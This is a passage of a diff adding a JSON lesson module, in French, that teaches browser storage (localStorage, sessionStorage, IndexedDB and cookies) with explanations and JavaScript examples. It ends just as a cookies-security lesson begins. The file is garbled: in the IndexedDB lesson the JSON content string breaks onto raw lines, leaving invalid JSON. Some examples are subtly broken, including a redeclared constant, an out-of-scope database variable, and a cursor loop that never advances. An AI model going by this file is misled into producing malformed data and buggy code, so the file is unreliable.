@@ -1,0 +1,677 @@
+{
+  "module": {
+    "id": "browser-storage",
+    "title": "Stockage Navigateur",
+    "description": "localStorage, sessionStorage, IndexedDB et cookies : stockez des données côté client efficacement",
+    "icon": "Database",
+    "requiredXp": 1100,
+    "color": "from-orange-400 to-red-600",
+    "courseId": "web-stack"
+  },
+  "lessons": [
+    {
+      "id": "storage-overview",
+      "moduleId": "browser-storage",
+      "title": "Vue d'ensemble du Stockage",
+      "order": 1,
+      "difficulty": "beginner",
+      "content": "# Essential to know\n- 4 options de stockage côté client : localStorage, sessionStorage, IndexedDB, Cookies\n- localStorage : persistant, 5-10MB, synchronne, string only\n- sessionStorage : comme localStorage mais seulement pour la session\n- IndexedDB : base de données NoSQL, 50MB+, async, complexe\n- Cookies : 4KB max, envoyés avec chaque requête HTTP\n- Choix selon : taille, persistance, sync/async, structure données\n\n---\n\n# Stockage Navigateur : Quel outil choisir ?\n\n## Les 4 Options\n\n### Comparaison Rapide\n\n| Caractéristique | localStorage | sessionStorage | IndexedDB | Cookies |\n|-----------------|--------------|----------------|-----------|---------|\n| **Capacité** | ~5-10MB | ~5-10MB | ~50MB+ | ~4KB |\n| **Persistant** | ✅ Oui | ❌ Non (session) | ✅ Oui | ✅ Oui |\n| **Async** | ❌ Non | ❌ Non | ✅ Oui | ❌ Non |\n| **Structure** | String | String | Objets/Files | String |\n| **HTTP** | ❌ Non | ❌ Non | ❌ Non | ✅ Oui |\n| **Accessibilité** | Très simple | Très simple | Complexe | Simple |\n\n## Quand utiliser quoi ?\n\n### ✅ localStorage - Bon pour :\n- Préférences utilisateur (thème, langue)\n- Token JWT (si pas sensible)\n- Cache de données simple\n- État de l'application\n- Panier e-commerce (temporaire)\n\n**Exemple :**\n```javascript\n// Sauvegarder le thème\nlocalStorage.setItem('theme', 'dark');\n\n// Récupérer au chargement\nconst theme = localStorage.getItem('theme') || 'light';\ndocument.body.className = theme;\n```\n\n### ✅ sessionStorage - Bon pour :\n- Données temporaires d'un formulaire multi-étapes\n- État pendant la navigation\n- Données sensibles qu'on ne veut pas persister\n- Panier pendant la session\n\n**Exemple :**\n```javascript\n// Formulaire en plusieurs étapes\n// Étape 1\nsessionStorage.setItem('step1', JSON.stringify({ name, email }));\n\n// Étape 2\nconst step1Data = JSON.parse(sessionStorage.getItem('step1'));\n```\n\n### ✅ IndexedDB - Bon pour :\n- Gros volumes de données (MB-GB)\n- Données structurées complexes\n- Applications offline-first\n- Fichiers binaires (images, vidéos)\n- Recherche et indexation\n\n**Exemple :**\n```javascript\n// Application de prise de notes offline\n// Stocker des milliers de notes avec recherche full-text\n```\n\n### ✅ Cookies - Bon pour :\n- Session serveur (sessionID)\n- Tracking / Analytics\n- Données nécessaires côté serveur\n- Authentication (avec HttpOnly pour sécurité)\n\n**Exemple :**\n```javascript\n// Session utilisateur\ndocument.cookie = 'sessionId=abc123; path=/; secure; samesite=strict';\n```\n\n## Limitations et Pièges\n\n### LocalStorage / SessionStorage\n\n**Limitations :**\n- Stockage limité (~5MB)\n- Uniquement des strings (JSON stringify/parse nécessaire)\n- Synchrone (bloque le thread principal)\n- Pas de structure de données complexe\n- Pas de requêtes/indices\n\n**Sécurité :**\n- Vulnérable au XSS (tout JS peut lire)\n- Ne jamais stocker de données sensibles (mots de passe, tokens)\n- Accessible à tout script de la même origin\n\n### IndexedDB\n\n**Limitations :**\n- API complexe et verbeuse\n- Pas de support des requêtes SQL\n- Limite de stockage varie selon le navigateur\n- Peut être effacé par l'utilisateur\n\n**Avantages :**\n- Async (ne bloque pas l'UI)\n- Transactions\n- Index pour recherche rapide\n- Supporte les gros fichiers binaires\n\n### Cookies\n\n**Limitations :**\n- Très petit (4KB)\n- Envoyés avec CHAQUE requête HTTP (overhead)\n- Complexe à manipuler en JS\n\n**Avantages :**\n- Expiration automatique\n- Accessible côté serveur\n- Options de sécurité (HttpOnly, Secure, SameSite)\n\n## Quota de Stockage\n\n```javascript\n// Vérifier l'espace disponible\nnavigator.storage.estimate().then(estimate => {\n  console.log('Utilisé:', estimate.usage);\n  console.log('Quota:', estimate.quota);\n  console.log('Restant:', estimate.quota - estimate.usage);\n});\n\n// Demander de la persistance (éviter suppression par le navigateur)\nnavigator.storage.persist().then(persisted => {\n  if (persisted) {\n    console.log('Stockage persistent accordé');\n  }\n});\n```\n\n## Architecture Recommandée\n\n```\nApplication\n    │\n    ├── localStorage\n    │   ├── userPreferences (thème, langue)\n    │   ├── authToken (si pas sensible)\n    │   └── cacheTimestamp\n    │\n    ├── sessionStorage\n    │   └── formData (temporaire)\n    │\n    ├── IndexedDB\n    │   ├── documents (gros contenu)\n    │   ├── searchIndex (pour recherche rapide)\n    │   └── offlineQueue (actions en attente)\n    │\n    └── Cookies\n        └── sessionId (côté serveur uniquement)\n```",
+      "codeExample": "// Comparaison pratique des 4 types de stockage\n\n// ========== localStorage ==========\n// Simple, persistant, limité à ~5MB\n\n// Sauvegarder\nlocalStorage.setItem('username', 'Marie');\nlocalStorage.setItem('settings', JSON.stringify({\n  theme: 'dark',\n  fontSize: 16,\n  notifications: true\n}));\n\n// Récupérer\nconst username = localStorage.getItem('username');\nconst settings = JSON.parse(localStorage.getItem('settings'));\n\n// Supprimer\nlocalStorage.removeItem('username');\n// localStorage.clear(); // Tout supprimer\n\n\n// ========== sessionStorage ==========\n// Même API que localStorage mais effacé à la fermeture\n\nsessionStorage.setItem('currentStep', '2');\nsessionStorage.setItem('formData', JSON.stringify({\n  name: 'John',\n  email: 'john@example.com'\n}));\n\nconst currentStep = sessionStorage.getItem('currentStep');\n\n\n// ========== Cookies ==========\n// Ancienne API, pas très pratique\n\n// Définir un cookie\ndocument.cookie = 'user=John; expires=Fri, 31 Dec 2024 23:59:59 GMT; path=/; secure; samesite=strict';\n\n// Lire tous les cookies\nconsole.log(document.cookie); // 'user=John; session=abc123'\n\n// Supprimer (mettre une date passée)\ndocument.cookie = 'user=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/';\n\n\n// ========== Helper moderne ==========\nconst Storage = {\n  // LocalStorage avec JSON automatique\n  set(key, value) {\n    localStorage.setItem(key, JSON.stringify(value));\n  },\n  \n  get(key, defaultValue = null) {\n    const item = localStorage.getItem(key);\n    return item ? JSON.parse(item) : defaultValue;\n  },\n  \n  remove(key) {\n    localStorage.removeItem(key);\n  },\n  \n  // SessionStorage\n  session: {\n    set(key, value) {\n      sessionStorage.setItem(key, JSON.stringify(value));\n    },\n    get(key, defaultValue = null) {\n      const item = sessionStorage.getItem(key);\n      return item ? JSON.parse(item) : defaultValue;\n    }\n  }\n};\n\n// Usage\nStorage.set('user', { name: 'Marie', id: 123 });\nconst user = Storage.get('user');\nconsole.log(user.name); // 'Marie'"
+    },
+    {
+      "id": "local-session-storage",
+      "moduleId": "browser-storage",
+      "title": "localStorage & sessionStorage",
+      "order": 2,
+      "difficulty": "beginner",
+      "content": "# Essential to know\n- API simple : setItem, getItem, removeItem, clear\n- Uniquement des strings (utiliser JSON.stringify/parse)\n- Stockage par domaine (même origin policy)\n- Synchrone (bloque le thread si gros volume)\n- Événement 'storage' pour sync entre onglets\n- sessionStorage = même API mais effacé à fermeture onglet\n\n---\n\n# localStorage et sessionStorage en Détail\n\n## API de Base\n\nLes deux ont la même API simple :\n\n```javascript\n// Stocker\nlocalStorage.setItem('clé', 'valeur');\nsessionStorage.setItem('clé', 'valeur');\n\n// Récupérer\nconst valeur = localStorage.getItem('clé');\nconst valeur = sessionStorage.getItem('clé');\n\n// Supprimer une entrée\nlocalStorage.removeItem('clé');\n\n// Supprimer tout\nlocalStorage.clear();\n\n// Nombre d'éléments\nconsole.log(localStorage.length);\n\n// Obtenir clé par index\nconst key = localStorage.key(0);\n```\n\n## Stocker des Objets\n\n```javascript\n// ❌ Ne fonctionne pas\nconst user = { name: 'Marie', age: 30 };\nlocalStorage.setItem('user', user);\nconsole.log(localStorage.getItem('user')); // '[object Object]' 😱\n\n// ✅ Utiliser JSON\nlocalStorage.setItem('user', JSON.stringify(user));\n\n// Récupérer\nconst userData = JSON.parse(localStorage.getItem('user'));\nconsole.log(userData.name); // 'Marie'\n```\n\n### Helper Type-Safe\n\n```typescript\nclass TypedStorage {\n  static set<T>(key: string, value: T): void {\n    try {\n      localStorage.setItem(key, JSON.stringify(value));\n    } catch (e) {\n      console.error('Storage error:', e);\n    }\n  }\n\n  static get<T>(key: string, defaultValue?: T): T | undefined {\n    try {\n      const item = localStorage.getItem(key);\n      return item ? JSON.parse(item) : defaultValue;\n    } catch (e) {\n      console.error('Parse error:', e);\n      return defaultValue;\n    }\n  }\n\n  static remove(key: string): void {\n    localStorage.removeItem(key);\n  }\n}\n\n// Usage\ninterface User {\n  id: number;\n  name: string;\n}\n\nTypedStorage.set<User>('currentUser', { id: 1, name: 'Marie' });\nconst user = TypedStorage.get<User>('currentUser');\n```\n\n## Différence clé : localStorage vs sessionStorage\n\n### localStorage\n- Persiste jusqu'à suppression explicite\n- Partagé entre tous les onglets de même domaine\n- Reste après fermeture/reouverture du navigateur\n\n### sessionStorage\n- Effacé quand onglet est fermé\n- Isolé par onglet (pas partagé)\n- Reste si on rafraîchit la page\n\n```javascript\n// Onglet 1\nlocalStorage.setItem('shared', 'data');    // ✅ Onglet 2 voit ça\nsessionStorage.setItem('private', 'data'); // ❌ Onglet 2 ne voit pas\n\n// Rafraîchir la page\n// localStorage : 'shared' toujours là\n// sessionStorage : 'private' toujours là\n\n// Fermer et rouvrir onglet\n// localStorage : 'shared' toujours là\n// sessionStorage : 'private' EFFACÉ\n```\n\n## Événement Storage (Sync entre Onglets)\n\n```javascript\n// Onglet 1 : écouter les changements\nwindow.addEventListener('storage', (event) => {\n  console.log('Clé modifiée:', event.key);\n  console.log('Ancienne valeur:', event.oldValue);\n  console.log('Nouvelle valeur:', event.newValue);\n  console.log('URL:', event.url);\n  \n  // Réagir au changement\n  if (event.key === 'theme') {\n    applyTheme(event.newValue);\n  }\n});\n\n// Onglet 2 : modifier une valeur\nlocalStorage.setItem('theme', 'dark');\n// → Déclenche l'événement dans l'onglet 1 !\n```\n\n**Important :** L'événement ne se déclenche PAS dans le même onglet qui fait le setItem !\n\n## Cas d'Usage Pratiques\n\n### 1. Thème Persistant\n\n```javascript\n// theme.js\nconst ThemeManager = {\n  get() {\n    return localStorage.getItem('theme') || 'light';\n  },\n  \n  set(theme) {\n    localStorage.setItem('theme', theme);\n    document.documentElement.setAttribute('data-theme', theme);\n  },\n  \n  toggle() {\n    const current = this.get();\n    const next = current === 'light' ? 'dark' : 'light';\n    this.set(next);\n  },\n  \n  init() {\n    const theme = this.get();\n    document.documentElement.setAttribute('data-theme', theme);\n  }\n};\n\n// Au chargement\nThemeManager.init();\n\n// HTML\n<button onclick=\"ThemeManager.toggle()\"\u003e🌓 Toggle Theme</button>\n```\n\n### 2. Formulaire Auto-save\n\n```javascript\n// form-autosave.js\nclass FormAutoSave {\n  constructor(formId) {\n    this.form = document.getElementById(formId);\n    this.storageKey = `form_${formId}`;\n    \n    this.load();\n    this.form.addEventListener('input', () => this.save());\n  }\n  \n  save() {\n    const formData = new FormData(this.form);\n    const data = Object.fromEntries(formData);\n    sessionStorage.setItem(this.storageKey, JSON.stringify(data));\n  }\n  \n  load() {\n    const saved = sessionStorage.getItem(this.storageKey);\n    if (saved) {\n      const data = JSON.parse(saved);\n      Object.entries(data).forEach(([key, value]) => {\n        const field = this.form.elements[key];\n        if (field) field.value = value;\n      });\n    }\n  }\n  \n  clear() {\n    sessionStorage.removeItem(this.storageKey);\n  }\n}\n\n// Usage\nconst formSaver = new FormAutoSave('contact-form');\n\n// À la soumission réussie\nformSaver.clear();\n```\n\n### 3. Panier E-commerce\n\n```javascript\n// cart.js\nconst Cart = {\n  key: 'shopping_cart',\n  \n  getItems() {\n    return JSON.parse(localStorage.getItem(this.key)) || [];\n  },\n  \n  addItem(product) {\n    const items = this.getItems();\n    const existing = items.find(item => item.id === product.id);\n    \n    if (existing) {\n      existing.quantity += 1;\n    } else {\n      items.push({ ...product, quantity: 1 });\n    }\n    \n    this.save(items);\n    this.updateUI();\n  },\n  \n  removeItem(productId) {\n    const items = this.getItems().filter(item => item.id !== productId);\n    this.save(items);\n    this.updateUI();\n  },\n  \n  save(items) {\n    localStorage.setItem(this.key, JSON.stringify(items));\n    window.dispatchEvent(new Event('cart-updated'));\n  },\n  \n  updateUI() {\n    const items = this.getItems();\n    const count = items.reduce((sum, item) => sum + item.quantity, 0);\n    document.getElementById('cart-count').textContent = count;\n  },\n  \n  getTotal() {\n    return this.getItems().reduce(\n      (sum, item) => sum + (item.price * item.quantity),\n      0\n    );\n  }\n};\n\n// Sync entre onglets\nwindow.addEventListener('storage', (e) => {\n  if (e.key === 'shopping_cart') {\n    Cart.updateUI();\n  }\n});\n```\n\n## Limites et Erreurs Courantes\n\n### Quota Exceeded\n\n```javascript\ntry {\n  localStorage.setItem('bigData', veryLargeString);\n} catch (e) {\n  if (e.name === 'QuotaExceededError') {\n    // Stockage plein !\n    console.error('Storage quota exceeded');\n    // Nettoyer ou utiliser IndexedDB\n  }\n}\n```\n\n### Mode Privé\n\nEn mode navigation privée, localStorage peut :\n- Être limité à 0\n- Lancer une erreur QuotaExceededError\n- Être effacé à la fermeture\n\n### Ne pas stocker :\n- Tokens d'authentification sensibles (risque XSS)\n- Mots de passe\n- Données personnelles sensibles\n- Données bancaires\n- Volumes importants (>5MB)",
+      "codeExample": "// Exemples complets localStorage/sessionStorage\n\n// ========== 1. Système de préférences ==========\nconst Preferences = {\n  defaults: {\n    theme: 'light',\n    language: 'fr',\n    fontSize: 16,\n    notifications: true,\n    sidebarCollapsed: false\n  },\n  \n  get(key) {\n    const stored = localStorage.getItem('prefs');\n    const prefs = stored ? JSON.parse(stored) : {};\n    return prefs[key] ?? this.defaults[key];\n  },\n  \n  set(key, value) {\n    const stored = localStorage.getItem('prefs');\n    const prefs = stored ? JSON.parse(stored) : {};\n    prefs[key] = value;\n    localStorage.setItem('prefs', JSON.stringify(prefs));\n    \n    // Notifier les autres onglets\n    window.dispatchEvent(new CustomEvent('pref-changed', {\n      detail: { key, value }\n    }));\n  },\n  \n  getAll() {\n    const stored = localStorage.getItem('prefs');\n    return { ...this.defaults, ...(stored ? JSON.parse(stored) : {}) };\n  },\n  \n  reset() {\n    localStorage.removeItem('prefs');\n  }\n};\n\n// Usage\nPreferences.set('theme', 'dark');\nconsole.log(Preferences.get('theme')); // 'dark'\n\n\n// ========== 2. Historique de recherche ==========\nconst SearchHistory = {\n  key: 'search_history',\n  maxItems: 10,\n  \n  getAll() {\n    return JSON.parse(localStorage.getItem(this.key)) || [];\n  },\n  \n  add(query) {\n    let history = this.getAll();\n    \n    // Supprimer si existe déjà\n    history = history.filter(item => item !== query);\n    \n    // Ajouter au début\n    history.unshift(query);\n    \n    // Garder seulement maxItems\n    history = history.slice(0, this.maxItems);\n    \n    localStorage.setItem(this.key, JSON.stringify(history));\n  },\n  \n  remove(query) {\n    const history = this.getAll().filter(item => item !== query);\n    localStorage.setItem(this.key, JSON.stringify(history));\n  },\n  \n  clear() {\n    localStorage.removeItem(this.key);\n  }\n};\n\n\n// ========== 3. Session temporaire ==========\nclass TemporarySession {\n  constructor(sessionId) {\n    this.key = `temp_session_${sessionId}`;\n  }\n  \n  setData(data) {\n    sessionStorage.setItem(this.key, JSON.stringify({\n      data,\n      timestamp: Date.now()\n    }));\n  }\n  \n  getData() {\n    const stored = sessionStorage.getItem(this.key);\n    if (!stored) return null;\n    \n    const { data, timestamp } = JSON.parse(stored);\n    \n    // Vérifier expiration (30 min)\n    if (Date.now() - timestamp > 30 * 60 * 1000) {\n      sessionStorage.removeItem(this.key);\n      return null;\n    }\n    \n    return data;\n  }\n  \n  clear() {\n    sessionStorage.removeItem(this.key);\n  }\n}\n\n// Usage pour multi-step form\nconst formSession = new TemporarySession('signup');\nformSession.setData({ step: 2, name: 'John' });\n\n\n// ========== 4. Cache simple avec expiration ==========\nconst Cache = {\n  set(key, value, ttlMinutes = 60) {\n    const item = {\n      value,\n      expiry: Date.now() + ttlMinutes * 60 * 1000\n    };\n    localStorage.setItem(`cache_${key}`, JSON.stringify(item));\n  },\n  \n  get(key) {\n    const itemStr = localStorage.getItem(`cache_${key}`);\n    if (!itemStr) return null;\n    \n    const item = JSON.parse(itemStr);\n    \n    if (Date.now() > item.expiry) {\n      localStorage.removeItem(`cache_${key}`);\n      return null;\n    }\n    \n    return item.value;\n  },\n  \n  clear() {\n    Object.keys(localStorage)\n      .filter(key => key.startsWith('cache_'))\n      .forEach(key => localStorage.removeItem(key));\n  }\n};\n\n// Usage\nCache.set('userProfile', userData, 30); // 30 min TTL\nconst cached = Cache.get('userProfile');"
+    },
+    {
+      "id": "indexeddb",
+      "moduleId": "browser-storage",
+      "title": "IndexedDB : Base de Données Navigateur",
+      "order": 3,
+      "difficulty": "advanced",
+      "content": "# Essential to know\n- IndexedDB = base de données NoSQL côté client\n- Stockage important (50MB à plusieurs GB selon navigateur)\n- Asynchrone (API basée sur les événements ou Promises)\n- Supporte index, transactions, curseurs\n- Stocke objets, fichiers, blobs\n- API native complexe → utiliser des wrappers (idb, localForage)\n- Parfait pour apps offline-first\n\n---\n\n# IndexedDB : La Base de Données du Navigateur\n\n## Pourquoi IndexedDB ?\n\n**localStorage est limité :**\n- Max ~5-10MB\n- Uniquement strings\n- Pas de recherche efficace\n- Synchrone (bloque l'UI)\n\n**IndexedDB offre :**\n- Stockage important (50MB → plusieurs GB)\n- Stockage d'objets natifs\n- Index pour recherche rapide\n- Transactions\n- Async (ne bloque pas)\n- Support fichiers/binaires\n\n## Concepts Clés\n
+```
+Database (MyAppDB)
+    └── Object Store (users)  ← Comme une table
+            ├── Index (byEmail)   ← Pour recherche rapide
+            ├── Index (byName)
+            └── Records
+                    ├── { id: 1, name: 'Marie', email: 'm@email.com' }
+                    ├── { id: 2, name: 'John', email: 'j@email.com' }
+                    └── { id: 3, name: 'Sarah', email: 's@email.com' }
+```
+
+## API IndexedDB Native (Complexe)
+
+```javascript
+// Ouvrir la base de données
+const request = indexedDB.open('MyAppDB', 1);
+
+// Créer/mettre à jour la structure
+request.onupgradeneeded = (event) => {
+  const db = event.target.result;
+  
+  // Créer un object store
+  const userStore = db.createObjectStore('users', { 
+    keyPath: 'id',
+    autoIncrement: true 
+  });
+  
+  // Créer des index
+  userStore.createIndex('byEmail', 'email', { unique: true });
+  userStore.createIndex('byName', 'name', { unique: false });
+};
+
+request.onsuccess = (event) => {
+  const db = event.target.result;
+  console.log('Base ouverte !');
+};
+
+// Ajouter des données
+const transaction = db.transaction(['users'], 'readwrite');
+const store = transaction.objectStore('users');
+
+const request = store.add({
+  name: 'Marie',
+  email: 'marie@example.com',
+  age: 30
+});
+
+request.onsuccess = () => {
+  console.log('Utilisateur ajouté !');
+};
+```
+
+**Problème :** L'API native est très verbeuse et basée sur les événements (vieux style).\n
+## Solution : Utiliser idb (Wrapper Moderne)
+
+```bash
+npm install idb
+```
+
+```javascript
+import { openDB } from 'idb';
+
+// Ouvrir/créer la base
+const db = await openDB('MyAppDB', 1, {
+  upgrade(db, oldVersion, newVersion, transaction) {
+    // Créer le store users
+    const userStore = db.createObjectStore('users', { 
+      keyPath: 'id',
+      autoIncrement: true 
+    });
+    
+    // Créer index
+    userStore.createIndex('byEmail', 'email', { unique: true });
+    userStore.createIndex('byAge', 'age');
+  }
+});
+
+// CRUD Operations
+
+// CREATE - Ajouter
+const id = await db.add('users', {
+  name: 'Marie',
+  email: 'marie@example.com',
+  age: 30
+});
+console.log('Créé avec ID:', id);
+
+// READ - Lire
+const user = await db.get('users', 1);
+const userByEmail = await db.getFromIndex('users', 'byEmail', 'marie@example.com');
+
+// UPDATE - Modifier
+await db.put('users', {
+  id: 1,  // ID obligatoire pour update
+  name: 'Marie Dupont',
+  email: 'marie@example.com',
+  age: 31
+});
+
+// DELETE - Supprimer
+await db.delete('users', 1);
+
+// GET ALL - Tout récupérer
+const allUsers = await db.getAll('users');
+
+// GET ALL avec index
+const users30Plus = await db.getAllFromIndex('users', 'byAge', IDBKeyRange.lowerBound(30));
+```
+
+## Recherche et Curseurs\n
+```javascript
+// Recherche avec range
+const youngUsers = await db.getAllFromIndex(
+  'users', 
+  'byAge', 
+  IDBKeyRange.bound(20, 30)  // 20 <= age <= 30
+);
+
+// Curseur pour itérer efficacement
+const cursor = await db.transaction('users').store.openCursor();
+
+while (cursor) {
+  console.log(cursor.value);
+  await cursor.continue();
+}
+
+// Curseur avec index
+const emailCursor = await db
+  .transaction('users')
+  .store
+  .index('byEmail')
+  .openCursor();
+```
+
+## Structure Complète : App de Notes\n
+```javascript
+// db.js
+import { openDB } from 'idb';
+
+const DB_NAME = 'NotesApp';
+const DB_VERSION = 1;
+
+export const initDB = async () => {
+  return openDB(DB_NAME, DB_VERSION, {
+    upgrade(db) {
+      // Store pour les notes
+      if (!db.objectStoreNames.contains('notes')) {
+        const noteStore = db.createObjectStore('notes', { 
+          keyPath: 'id', 
+          autoIncrement: true 
+        });
+        noteStore.createIndex('byDate', 'updatedAt');
+        noteStore.createIndex('byCategory', 'category');
+        noteStore.createIndex('bySearch', 'title'); // Pour recherche simple
+      }
+      
+      // Store pour les catégories
+      if (!db.objectStoreNames.contains('categories')) {
+        db.createObjectStore('categories', { 
+          keyPath: 'id',
+          autoIncrement: true 
+        });
+      }
+      
+      // Store pour les fichiers attachés
+      if (!db.objectStoreNames.contains('attachments')) {
+        const attachStore = db.createObjectStore('attachments', { 
+          keyPath: 'id',
+          autoIncrement: true 
+        });
+        attachStore.createIndex('byNote', 'noteId');
+      }
+    }
+  });
+};
+
+// API Notes
+export const notesAPI = {
+  async getAll() {
+    const db = await initDB();
+    return db.getAll('notes');
+  },
+  
+  async getById(id) {
+    const db = await initDB();
+    return db.get('notes', id);
+  },
+  
+  async create(note) {
+    const db = await initDB();
+    const newNote = {
+      ...note,
+      createdAt: Date.now(),
+      updatedAt: Date.now()
+    };
+    return db.add('notes', newNote);
+  },
+  
+  async update(id, updates) {
+    const db = await initDB();
+    const existing = await db.get('notes', id);
+    const updated = {
+      ...existing,
+      ...updates,
+      id,
+      updatedAt: Date.now()
+    };
+    return db.put('notes', updated);
+  },
+  
+  async delete(id) {
+    const db = await initDB();
+    await db.delete('notes', id);
+    // Supprimer aussi les attachments
+    const attachments = await db.getAllFromIndex('attachments', 'byNote', id);
+    const tx = db.transaction('attachments', 'readwrite');
+    await Promise.all(attachments.map(att => tx.store.delete(att.id)));
+    await tx.done;
+  },
+  
+  async search(query) {
+    const db = await initDB();
+    const allNotes = await db.getAll('notes');
+    return allNotes.filter(note => 
+      note.title.toLowerCase().includes(query.toLowerCase()) ||
+      note.content.toLowerCase().includes(query.toLowerCase())
+    );
+  },
+  
+  async getByCategory(categoryId) {
+    const db = await initDB();
+    return db.getAllFromIndex('notes', 'byCategory', categoryId);
+  }
+};
+```
+
+## Gestion des Fichiers\n
+```javascript
+// Sauvegarder un fichier dans IndexedDB
+export async function saveFile(file, noteId) {
+  const db = await initDB();
+  const arrayBuffer = await file.arrayBuffer();
+  
+  return db.add('attachments', {
+    noteId,
+    name: file.name,
+    type: file.type,
+    size: file.size,
+    data: arrayBuffer,
+    createdAt: Date.now()
+  });
+}
+
+// Récupérer et télécharger un fichier
+export async function downloadFile(attachmentId) {
+  const db = await initDB();
+  const attachment = await db.get('attachments', attachmentId);
+  
+  const blob = new Blob([attachment.data], { type: attachment.type });
+  const url = URL.createObjectURL(blob);
+  
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = attachment.name;
+  a.click();
+  
+  URL.revokeObjectURL(url);
+}
+```\n\n## Synchronisation Offline-Online\n\n```javascript\n// sync-queue.js\nconst syncQueue = {\n  async add(action) {\n    const db = await initDB();\n    return db.add('syncQueue', {\n      action,\n      timestamp: Date.now(),\n      retries: 0\n    });\n  },\n  \n  async process() {\n    const db = await initDB();\n    const items = await db.getAll('syncQueue');\n    \n    for (const item of items) {\n      try {\n        await this.execute(item.action);\n        await db.delete('syncQueue', item.id);\n      } catch (error) {\n        // Retry plus tard\n        await db.put('syncQueue', {\n          ...item,\n          retries: item.retries + 1\n        });\n      }\n    }\n  },\n  \n  async execute(action) {\n    const response = await fetch('/api/sync', {\n      method: 'POST',\n      headers: { 'Content-Type': 'application/json' },\n      body: JSON.stringify(action)\n    });\n    \n    if (!response.ok) throw new Error('Sync failed');\n  }\n};\n\n// Usage\n// Quand offline\nnotesAPI.create({ title: 'Note', content: 'Content' });\nsyncQueue.add({ type: 'CREATE_NOTE', data: note });\n\n// Quand online\nwindow.addEventListener('online', () => {\n  syncQueue.process();\n});\n```",
+      "codeExample": "// Exemple complet IndexedDB avec idb\n\nimport { openDB } from 'idb';\n\n// ========== Initialisation ==========\nconst DB_NAME = 'TaskManager';\nconst DB_VERSION = 1;\n\nasync function getDB() {\n  return openDB(DB_NAME, DB_VERSION, {\n    upgrade(db, oldVersion, newVersion, transaction) {\n      console.log(`Mise à jour DB: ${oldVersion} → ${newVersion}`);\n      \n      // Store Tâches\n      if (!db.objectStoreNames.contains('tasks')) {\n        const taskStore = db.createObjectStore('tasks', {\n          keyPath: 'id',\n          autoIncrement: true\n        });\n        \n        // Index pour recherche rapide\n        taskStore.createIndex('byStatus', 'status');\n        taskStore.createIndex('byPriority', 'priority');\n        taskStore.createIndex('byDueDate', 'dueDate');\n        taskStore.createIndex('byProject', 'projectId');\n      }\n      \n      // Store Projets\n      if (!db.objectStoreNames.contains('projects')) {\n        db.createObjectStore('projects', {\n          keyPath: 'id',\n          autoIncrement: true\n        });\n      }\n    }\n  });\n}\n\n// ========== API Tâches ==========\nexport const TaskDB = {\n  // CRUD basique\n  async create(task) {\n    const db = await getDB();\n    const newTask = {\n      ...task,\n      createdAt: Date.now(),\n      updatedAt: Date.now(),\n      status: task.status || 'todo'\n    };\n    const id = await db.add('tasks', newTask);\n    return { ...newTask, id };\n  },\n  \n  async getById(id) {\n    const db = await getDB();\n    return db.get('tasks', id);\n  },\n  \n  async update(id, updates) {\n    const db = await getDB();\n    const existing = await db.get('tasks', id);\n    if (!existing) throw new Error('Task not found');\n    \n    const updated = {\n      ...existing,\n      ...updates,\n      id,\n      updatedAt: Date.now()\n    };\n    await db.put('tasks', updated);\n    return updated;\n  },\n  \n  async delete(id) {\n    const db = await getDB();\n    await db.delete('tasks', id);\n  },\n  \n  // Requêtes avec index\n  async getAll() {\n    const db = await getDB();\n    return db.getAll('tasks');\n  },\n  \n  async getByStatus(status) {\n    const db = await getDB();\n    return db.getAllFromIndex('tasks', 'byStatus', status);\n  },\n  \n  async getByProject(projectId) {\n    const db = await getDB();\n    return db.getAllFromIndex('tasks', 'byProject', projectId);\n  },\n  \n  async getHighPriority() {\n    const db = await getDB();\n    return db.getAllFromIndex('tasks', 'byPriority', 'high');\n  },\n  \n  // Recherche texte (scan tous les records)\n  async search(query) {\n    const db = await getDB();\n    const tasks = await db.getAll('tasks');\n    const lowerQuery = query.toLowerCase();\n    \n    return tasks.filter(task =>\n      task.title.toLowerCase().includes(lowerQuery) ||\n      (task.description && task.description.toLowerCase().includes(lowerQuery))\n    );\n  },\n  \n  // Curseur pour grandes collections\n  async *iterateByDate() {\n    const db = await getDB();\n    const tx = db.transaction('tasks', 'readonly');\n    const index = tx.store.index('byDueDate');\n    \n    let cursor = await index.openCursor();\n    while (cursor) {\n      yield cursor.value;\n      cursor = await cursor.continue();\n    }\n  },\n  \n  // Statistiques\n  async getStats() {\n    const db = await getDB();\n    const tasks = await db.getAll('tasks');\n    \n    return {\n      total: tasks.length,\n      todo: tasks.filter(t => t.status === 'todo').length,\n      doing: tasks.filter(t => t.status === 'doing').length,\n      done: tasks.filter(t => t.status === 'done').length,\n      highPriority: tasks.filter(t => t.priority === 'high').length\n    };\n  },\n  \n  // Export toutes les données\n  async export() {\n    const db = await getDB();\n    return {\n      tasks: await db.getAll('tasks'),\n      projects: await db.getAll('projects'),\n      exportedAt: new Date().toISOString()\n    };\n  },\n  \n  // Import données\n  async import(data) {\n    const db = await getDB();\n    const tx = db.transaction(['tasks', 'projects'], 'readwrite');\n    \n    // Vider existant\n    await tx.objectStore('tasks').clear();\n    await tx.objectStore('projects').clear();\n    \n    // Ajouter nouvelles données\n    for (const task of data.tasks) {\n      await tx.objectStore('tasks').add(task);\n    }\n    for (const project of data.projects) {\n      await tx.objectStore('projects').add(project);\n    }\n    \n    await tx.done;\n  },\n  \n  // Compter (plus rapide que getAll)\n  async count() {\n    const db = await getDB();\n    return db.count('tasks');\n  }\n};\n\n\n// ========== Usage dans React ==========\nfunction TaskManager() {\n  const [tasks, setTasks] = useState([]);\n  const [stats, setStats] = useState(null);\n  \n  useEffect(() => {\n    loadTasks();\n    loadStats();\n  }, []);\n  \n  const loadTasks = async () => {\n    const allTasks = await TaskDB.getAll();\n    setTasks(allTasks);\n  };\n  \n  const loadStats = async () => {\n    const s = await TaskDB.getStats();\n    setStats(s);\n  };\n  \n  const addTask = async (title) => {\n    await TaskDB.create({\n      title,\n      status: 'todo',\n      priority: 'medium'\n    });\n    loadTasks();\n    loadStats();\n  };\n  \n  const completeTask = async (id) => {\n    await TaskDB.update(id, { status: 'done' });\n    loadTasks();\n    loadStats();\n  };\n  \n  const searchTasks = async (query) => {\n    if (!query) {\n      loadTasks();\n      return;\n    }\n    const results = await TaskDB.search(query);\n    setTasks(results);\n  };\n  \n  // ... JSX\n}"
+    },
+    {
+      "id": "cookies-security",
+      "moduleId": "browser-storage",
+      "title": "Cookies et Sécurité",
+      "order": 4,
+      "difficulty": "intermediate",
